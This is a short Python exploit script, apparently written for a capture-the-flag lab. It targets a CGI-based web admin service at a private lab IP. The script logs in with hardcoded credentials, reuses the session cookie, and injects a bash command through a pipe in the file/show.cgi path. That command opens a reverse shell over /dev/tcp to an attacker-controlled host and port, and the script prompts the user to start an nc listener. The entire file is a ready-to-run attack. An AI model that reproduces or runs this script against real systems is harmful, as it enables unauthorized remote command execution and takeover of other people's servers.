import requests
import string, secrets


targetIP="10.10.147.119"
lhost="10.17.72.94"
lport="6666"

print("[+] Start a listener (nc -nlvp "+lport+")")

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
url = f"http://{targetIP}/session_login.cgi"
r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)


if r.status_code == 302 and r.cookies["sid"] != None:
    print("[+] Login Sucessful")
else:
    print("[-] Failed to login")

    
c=r.cookies["sid"]
def random():
    alphaNum = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
    return randChar

def payload():
    print("[+] Trying to get a shell")
    payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
    return payload
exp = f"http://{targetIP}/file/show.cgi/bin/{random()}|{payload()}|"

req = requests.post(exp, cookies={"sid":c}, verify=False, allow_redirects=False)